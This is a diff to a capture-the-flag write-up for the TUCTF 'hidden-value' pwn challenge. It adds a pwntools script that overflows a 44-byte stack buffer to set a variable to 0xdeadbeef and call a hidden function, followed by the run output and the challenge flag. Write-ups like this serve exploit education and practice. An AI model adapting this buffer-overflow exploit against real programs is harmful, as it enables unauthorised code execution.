@@ -85,7 +85,40 @@ void hidden_command(void)
 ```
 Here is the problem. We don't have immediately in the main a buffer overflow but in the buffer of main will cause a bof in greet_user() cause in the
 first one the buffer size is 112 and the others is 44. So after 44 bytes we have a bof and we can overwrite the value of local c to deadbeef to execute
-hidden_command() funtion that will that will give us the flag
+hidden_command() funtion that will give us the flag
+
+## Exploitation
+
+Here is the python script
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+p = process('./hidden-value')
+#p = remote('chal.tuctf.com', 30011)
+param = 0xdeadbeef
+padding = b'a' * 44
+
+payload = flat(
+	padding,
+	param
+	)
+
+p.sendline(payload)
+success(print(p.recvall()))
+
+```
+```console
+┌──(vein㉿vein)-[~/tuctf/pwn_hidden-value]
+└─$ ./exploit.py
+[+] Starting local process './hidden-value': pid 2908
+[+] Receiving all data: Done (109B)
+[*] Stopped process './hidden-value' (pid 2908)
+b'Enter your name: Congratulations! You have executed the hidden command.\nThe flag is: fake{fl4g_f0r_t3st1ng}\n\n'
+```
+The original flag was: TUCTF{pr4cti4l_buffer_overrun}
+
 
 
 
